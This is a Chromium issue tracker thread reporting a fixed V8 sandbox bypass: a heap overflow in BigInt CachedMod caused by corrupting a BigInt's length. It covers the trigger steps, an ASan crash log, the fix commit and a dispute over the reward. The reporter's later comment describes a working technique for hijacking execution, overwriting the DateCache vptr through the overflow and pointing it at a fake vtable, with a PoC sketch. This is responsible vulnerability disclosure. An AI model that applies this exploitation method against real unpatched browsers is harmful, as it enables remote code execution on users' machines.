# V8 Sandbox Bypass: BigInt CachedMod Native Heap OOB via Corrupted BigInt Length

| Field | Value |
|-------|-------|
| **Issue ID** | [496618662](https://issues.chromium.org/issues/496618662) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | pi...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2026-03-27 |
| **Bounty** | $5,000.00 |

## Description

## VULNERABILITY DETAILS

### Summary

The optimization admits a divisor into the caching pipeline based on a transient, attacker-corrupted BigInt length, but later reuses the same object identity after the length has been changed again. This breaks the invariant that cached divisors never exceed `kMaxCachedModDivisorSize` (32 digits), and lets `CachedMod` use a fixed 100-digit scratch buffer as if it were large enough for a 50-digit divisor, producing a native heap OOB write in `MultiplySchoolbook`.

### Details

The vulnerable flow starts in `MutableBigInt_AbsoluteModAndCanonicalize(...)`:

1. A divisor becomes the next cache candidate when `Y.len()` is between 2 and 32.
2. The cache candidate is tracked by **object identity** (`next_cached_bigint_divisor`), not by a trusted copied length.
3. Once the per-processor counter reaches 100, V8 promotes that same object to the cached divisor and calls `CachedMod_MakeInverse(Y)`.
4. On the next `%`, V8 takes the cached fast path and `CachedMod(...)` assumes the divisor length still satisfies the original max-32 invariant.

```
// src/objects/bigint.cc
if (y == heap->cached_bigint_divisor()) [[likely]] {
  bigint::Digits X = x->digits();
  bigint::Digits Y = y->digits();
  if (X.len() <= 2 * Y.len()) [[likely]] {
    bigint::RWDigits Z = result->rw_digits();
    bigint::digit_t top_digit =
        isolate->bigint_processor()->CachedMod(Z, X, Y);
    MutableBigInt::Canonicalize(result, Z.len(), top_digit);
    return 0;
  }
} else {
  bigint::Processor* processor = isolate->bigint_processor();
  bigint::Digits Y = y->digits();
  if (y == heap->next_cached_bigint_divisor()) {
    static constexpr int kCachingThreshold = 100;
    if (processor->inc_divisor_count() == kCachingThreshold) {
      heap->SetCachedBigIntDivisor(y);
      processor->CachedMod_MakeInverse(Y);
    }
  } else if (Y.len() >= 2 &&
             Y.len() <= bigint::Processor::kMaxCachedModDivisorSize) {
    heap->SetNextCachedBigIntDivisor(y);
    processor->reset_divisor_count();
  }
}

```

The cached path relies on a fixed-size small scratch buffer:

```
// src/bigint/bigint.h
static constexpr uint32_t kMaxCachedModDivisorSize = 32;
static constexpr int kSmallScratchSize = 100;
static_assert(kSmallScratchSize >= kMaxCachedModDivisorSize * 3 + 1);

int inc_divisor_count() { return ++divisor_count_; }
void reset_divisor_count() { divisor_count_ = 1; }

```

But `CachedMod(...)` computes its scratch requirement from the now-attacker-controlled divisor length:

```
// src/bigint/bigint-inl.h
ALWAYS_INLINE digit_t Processor::CachedMod(RWDigits& R, Digits& A, Digits& B) {
  Digits& inv = GetCachedInverse();
  uint32_t n = B.len();
  DCHECK(n >= 2);
  DCHECK(n <= A.len() && A.len() <= 2 * n);
  DCHECK(inv.len() == n + 1);
  DCHECK(R.len() == n);

  uint32_t scratch_space = A.len() + inv.len();
  static_assert(kSmallScratchSize >= kMaxCachedModDivisorSize * 3 + 1);
  RWDigits scratch = GetSmallScratch_NoCheck();
  scratch.set_len(scratch_space);

  if (A.len() >= inv.len()) {
    MultiplySchoolbook(scratch, A, inv);
  } else {
    MultiplySchoolbook(scratch, inv, A);
  }
  // ...
}

```

A stable trigger is:

1. Create `y` with 50 digits and `x` with 100 digits.
2. Corrupt `y`’s BigInt length bitfield from 50 to 30 .
3. Execute `x % y` 99 times.
   - The first `%` sets `next_cached_bigint_divisor = y` and `reset_divisor_count()` to 1.
   - The next 98 `%` operations raise `divisor_count_` to 99.
4. Reacquire `y`’s current address and restore its length to 50.
5. The next `%` increments the counter to 100 and runs `CachedMod_MakeInverse(Y)` with `Y.len() == 50`.
6. The following `%` enters `CachedMod(...)` with:
   - `A.len() = 100`
   - `n = 50`
   - `inv.len() = 51`
   - `scratch_space = 100 + 51 = 151`

The backing allocation returned by `GetSmallScratch_NoCheck()` is still only 100 digits (800 bytes), so `MultiplySchoolbook(...)` writes 51 digits / 408 bytes past the end of that native heap buffer.

## INTRODUCING COMMIT

### Bisect Result

The feature that introduced this bug is perhaps the CachedMod optimization added by:

- `d24fdbe8645ead56c78c03ce60d8974e4c896279`
- **Date:** 2026-03-02 16:17:17 -0800
- **Subject:** `[bigint] Modulo division with cached multiplicative inverse`

That commit was then reverted by:

- `d285a619df6183f7d1e307bcb74c06d6d26eba24`
- **Subject:** `Revert "[bigint] Modulo division with cached multiplicative inverse"`

The current line of development reintroduced the vulnerable logic with:

- `172815d239e447aaa1f105c932d8acfa6e9f67ca`
- **Date:** 2026-03-03 07:42:50 -0800
- **Subject:** `Reland "[bigint] Modulo division with cached multiplicative inverse"`

So the **historical first introducing commit** is `d24fdbe8645`, while the **effective introducing commit in the current ancestry** is `172815d239e`.

A quick source-level bisect signal is that `172815d239e^` has no `cached_bigint_divisor` / `next_cached_bigint_divisor` logic in `MutableBigInt_AbsoluteModAndCanonicalize(...)`, while `172815d239e` adds the entire caching pipeline and `CachedMod(...)` scratch-buffer fast path.

## Version

Test on V8 14.8.99:

```
git checkout 14.8.99

```
## REPRODUCTION CASE

Build `d8` with ASan + sandbox + `v8_enable_memory_corruption_api` and run:

```
ASAN_OPTIONS=halt_on_error=1 ./d8 --sandbox-testing poc.js

```

Observed crash on the updated ASan build:

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x7a9200000000,0x7b9200000000)
=================================================================
==1485207==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7d5ae00f9fa0 at pc 0x558996725ca2 bp 0x7ffe23d56690 sp 0x7ffe23d56688
WRITE of size 8 at 0x7d5ae00f9fa0 thread T0
    #0 0x558996725ca1 in v8::bigint::MultiplySchoolbook(v8::bigint::RWDigits, v8::bigint::Digits, v8::bigint::Digits) src/bigint/bigint.h:162:37
    #1 0x558996711035 in v8::internal::MutableBigInt_AbsoluteModAndCanonicalize(unsigned long, unsigned long, unsigned long, unsigned long) src/bigint/bigint-inl.h
    #2 0x55899bbdb0e8 in Builtins_BigIntModulusNoThrow setup-isolate-deserialize.cc
    #3 0x55899bc92501 in Builtins_ModHandler setup-isolate-deserialize.cc
    #4 0x55899bad78bb in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #5 0x55899bad465b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #6 0x55899bad43aa in Builtins_JSEntry setup-isolate-deserialize.cc
    #7 0x558995ce1c07 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/simulator.h:216:12
    #8 0x558995ce454c in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:574:10
    #9 0x55899582bfbd in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2034:7
    #10 0x55899533be2e in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1041:44
    #11 0x558995381243 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5670:10
    #12 0x55899538ffbf in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6691:37
    #13 0x55899538f14e in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6599:18
    #14 0x558995394418 in v8::Shell::Main(int, char**) src/d8/d8.cc:7516:18
    #15 0x7fdae0dfbd79 in __libc_start_main csu/../csu/libc-start.c:308:16

0x7d5ae00f9fa0 is located 0 bytes after 800-byte region [0x7d5ae00f9c80,0x7d5ae00f9fa0)
allocated by thread T0 here:
    #0 0x55899530221d in operator new[](unsigned long) (/home/user/v8_build/v8/out/release_asan_14_4_201/d8+0x14bb21d) (BuildId: 0fd4e37526f252c9)
    #1 0x558998e9dc8d in v8::bigint::ProcessorImpl::CachedMod_MakeInverse(v8::bigint::Digits&) gen/third_party/libc++/src/include/__memory/unique_ptr.h:780:55
    #2 0x55899671332e in v8::internal::MutableBigInt_AbsoluteModAndCanonicalize(unsigned long, unsigned long, unsigned long, unsigned long) src/objects/bigint.cc:1676:20
    #3 0x55899bbdb0e8 in Builtins_BigIntModulusNoThrow setup-isolate-deserialize.cc
    #4 0x55899bc92501 in Builtins_ModHandler setup-isolate-deserialize.cc
    #5 0x55899bad78bb in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #6 0x55899bad465b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #7 0x55899bad43aa in Builtins_JSEntry setup-isolate-deserialize.cc
    #8 0x558995ce1c07 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/simulator.h:216:12
    #9 0x558995ce454c in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:574:10
    #10 0x55899582bfbd in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2034:7
    #11 0x55899533be2e in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1041:44
    #12 0x558995381243 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5670:10
    #13 0x55899538ffbf in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6691:37
    #14 0x55899538f14e in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6599:18
    #15 0x558995394418 in v8::Shell::Main(int, char**) src/d8/d8.cc:7516:18
    #16 0x7fdae0dfbd79 in __libc_start_main csu/../csu/libc-start.c:308:16

SUMMARY: AddressSanitizer: heap-buffer-overflow src/bigint/bigint.h:162:37 in v8::bigint::MultiplySchoolbook(v8::bigint::RWDigits, v8::bigint::Digits, v8::bigint::Digits)
Shadow bytes around the buggy address:
  0x7d5ae00f9d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ae00f9d80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ae00f9e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ae00f9e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ae00f9f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7d5ae00f9f80: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ae00fa000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ae00fa080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ae00fa100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ae00fa180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ae00fa200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1485207==ABORTING

## V8 sandbox violation detected!

```
## FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

**Type of crash**: v8 sandbox violation

## CREDIT INFORMATION

Reporter credit: Picasso from Dawn Security Lab, JD.com

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 672 B)
- [exp.js](attachments/exp.js) (text/javascript, 2.3 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2026-03-27)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6610607704932352.

### ar...@google.com (2026-03-27)

I can reproduce this locally, also uploaded to CF. Jakob CYPTAL?

### jk...@chromium.org (2026-03-27)

Thanks for the report.

FWIW, this bug report is a bit confusing to read because the code has changed since the snippet in the OP (via [crrev.com/c/7657784](https://crrev.com/c/7657784), which fixed a similar but different issue).  

The repro is good though. Fix in flight.

### 24...@project.gserviceaccount.com (2026-03-27)

Detailed Report: https://clusterfuzz.com/testcase?key=6610607704932352

Fuzzer: None
Job Type: linux_asan_d8_sandbox_testing
Platform Id: linux

Crash Type: V8 sandbox violation
Crash Address: 0x762ca87e13a0
Crash State:
  v8::bigint::MultiplySchoolbook
  v8::internal::MutableBigInt_AbsoluteModAndCanonicalize
  Builtins_BigIntModulusNoThrow
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_sandbox_testing&range=105566:105567

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6610607704932352

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### dx...@google.com (2026-03-30)

Project: v8/v8  

Branch:  main  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7706644>

[sandbox][bigint] Harden CachedMod\_MakeInverse against corruption

---


Expand for full commit details
```
     
    Checking the length of a prospective cached divisor when we first 
    see it isn't enough, we must check it again when we create and 
    cache its inverse because in-sandbox corruption could have modified 
    it by then. 
     
    Fixed: 496618662 
    Change-Id: Idcd6e7f8b7a7d849ae05b6513bf3af37ec2cf60a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7706644 
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106126}

```

---

Files:

- M `src/objects/bigint.cc`
- A `test/mjsunit/sandbox/regress-496618662.js`

---

Hash: [6294f47ea49c774058fb75cc9b9c9e7c39e857a6](https://chromiumdash.appspot.com/commit/6294f47ea49c774058fb75cc9b9c9e7c39e857a6)  

Date: Fri Mar 27 17:54:16 2026


---

### 24...@project.gserviceaccount.com (2026-03-30)

ClusterFuzz testcase 6610607704932352 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_sandbox_testing&range=106125:106126

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### pi...@gmail.com (2026-05-25)

## Exploitation: Full Sandbox Bypass through Overwriting the DateCache vptr for PC Control

### Tested V8 Version: 14.8.99

This native heap OOB write is not limited to an allocator crash. On the tested V8 14.8.99 release `d8`, it can be turned into a stable C++ virtual-call hijack.

The useful setup uses `n = 40`, not the `n = 50` configuration used above for the straightforward ASan reproduction. When the 40 digits of the divisor `y` are all `1`, `CachedMod_MakeInverse(...)` produces a sparse cached inverse:

```
inv[0]  = 0xffffffffffffffff
inv[40] = 0xffffffffffffffff
all other inv digits are 0

```

On the following cached fast path, choose a dividend `x` with 80 digits:

```
n = 40
A.len() = 80
inv.len() = 41
scratch_space = 80 + 41 = 121

```

The real `small_scratch_` backing allocation is still only 100 digits (800 bytes), so `MultiplySchoolbook(scratch, A, inv)` writes `small_scratch_[100]` through `small_scratch_[120]`. Because the inverse only has non-zero digits at indices 0 and 40, specific output digits are directly controlled by specific `x` digits. The exploit uses:

```
small_scratch_[112] = 1 - x_digits[72]  (mod 2^64)

```

So setting `x_digits[72]` to `1 - wanted_value` writes an arbitrary 64-bit value at `small_scratch_ + 0x380`.

In this release layout, `small_scratch_ + 0x380` overlaps the first qword of the native `DateCache` object, i.e. its C++ vptr. `DateCache` is stored in `Isolate::date_cache_`, and Date operations eventually call virtual methods through it:

```
// src/date/date.h
virtual int GetLocalOffsetFromOS(int64_t time_ms, bool is_utc);

// src/date/date.cc
int DateCache::LocalOffsetInMs(int64_t time_ms, bool is_utc) {
  if (!is_utc) {
    return GetLocalOffsetFromOS(time_ms, is_utc);
  }
  // ...
}

```

The fake vtable can live in the sandbox heap. A simple placement is to reuse the `x` BigInt's own digit storage:

1. Fill `x_digits[0..7]` with the target PC, for example `0x414141414141`.
2. Use `Sandbox.base + Sandbox.getAddressOf(x) + 8` as the fake vtable address, which points to `x`'s raw digits.
3. Patch `x_digits[72]` to `1 - fake_vtable_addr`, so the OOB write replaces the `DateCache` vptr with the fake vtable pointer.
4. Trigger `new Date(42).toString()`. This reaches `DateCache::LocalOffsetInMs(...)`, then calls the virtual `GetLocalOffsetFromOS(...)`, loading `0x414141414141` from the fake vtable as the call target.

The core PoC shape is:

```
const N = 40;
const TARGET_PC = 0x414141414141n;

const y = prepareCachedMod();      // Poison y.length to 30, restore to 40 before caching.
const x = makeXPlaceholder(TARGET_PC);

const fake_vtable =
    BigInt(Sandbox.base) + BigInt(Sandbox.getAddressOf(x)) + 8n;

// small_scratch_[112] = 1 - x_digits[72], overwriting the DateCache vptr.
mem.setBigUint64(Sandbox.getAddressOf(x) + 8 + 72 * 8,
                 (1n - fake_vtable) & 0xffffffffffffffffn, true);

x % y;
new Date(42).toString();

```

Running the attached EXP on `out/x64.release/d8`:

```
./out/x64.release/d8 --sandbox-testing exp.js

```

produces a sandbox violation at the arbitrarily chosen PC value:

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
target_pc=0x414141414141

## V8 sandbox violation detected!

Received signal 11 SEGV_MAPERR 414141414141

```

The corresponding GDB stop is:

```
#0  0x0000414141414141 in ?? ()
#1  0x0000555556df1c89 in v8::internal::DateCache::LocalOffsetInMs(long, bool) ()
#2  0x000055555721e84d in v8::internal::JSDate::SetValue(v8::internal::Isolate*, double) ()
#3  0x000055555721e803 in v8::internal::JSDate::New(...)

rip 0x414141414141
rax 0x1667010713d4

```

### pi...@gmail.com (2026-06-13)

Hello, any update?

### cl...@chromium.org (2026-06-15)

This issue still is still in the `reward-topanel` hotlist, so the VRP panel will take a look at it eventually.

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
v8 Sandbox


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pi...@gmail.com (2026-06-16)

Hello,Could the reward panel please reconsider the reward tier for this issue?

I believe this should qualify for the **full V8 Sandbox bypass reward** rather than the baseline memory-corruption reward. In [comment 8](https://issues.chromium.org/issues/496618662#comment8), I demonstrated PC control outside the V8 Sandbox boundary.

This seems consistent with previous full sandbox bypass cases such as [issue 481295170](https://issues.chromium.org/issues/481295170), [issue 451355210](https://issues.chromium.org/issues/451355210), and [issue 390639820](https://issues.chromium.org/issues/390639820), which also demonstrated similar PC control / AAW-level impact.

I would be happy to provide a more complete RCE script or additional exploitation details if needed, but my understanding is that previous full-reward cases generally only required PC control and/or AAW.

### aj...@google.com (2026-06-25)

The panel makes decisions based on the original report.

### pi...@gmail.com (2026-06-26)

Hello,

Thank you for the clarification. I understand that the panel makes decisions based on the original report, but appended exploit details in the same issue thread should also be considered for the final reward tier.

I have seen many historical Chromium issues where the exploit / PoC was completed in later appended comments, and those details were still considered for the final impact and reward assessment. For example, in [issue 443475183 comment 14](https://issues.chromium.org/issues/443475183#comment14), it was stated that providing an exploit could make the issue eligible for the full V8 Sandbox bypass reward.

In this issue, I appended the exploit evidence in comment 8, demonstrating PC control outside the V8 Sandbox boundary. This is consistent with previous full V8 Sandbox bypass cases such as [issue 481295170](https://issues.chromium.org/issues/481295170), [issue 451355210](https://issues.chromium.org/issues/451355210), and [issue 390639820](https://issues.chromium.org/issues/390639820).

Could the panel please reconsider the reward tier with comment 8 taken into account?

I would be happy to provide a more complete RCE script or additional exploitation details if needed.

### ch...@google.com (2026-07-07)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### sp...@google.com (2026-07-10)

*NOTE: This is an automatically generated email*

Hello,

Chrome Vulnerability Rewards Program (VRP) Panel has decided that the security impact of this
issue does not meet the criteria to qualify for a reward.

Rationale for this decision:

No change. The information was provided after the fix.

Note that the fact that this issue is not being rewarded does not mean
that the product team won't fix the issue. We have filed a bug with the product
team and they will review your report and decide if a fix is required. We'll
let you know if the issue was fixed.

Regards,   

Google Security Bot

*How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/496618662)*
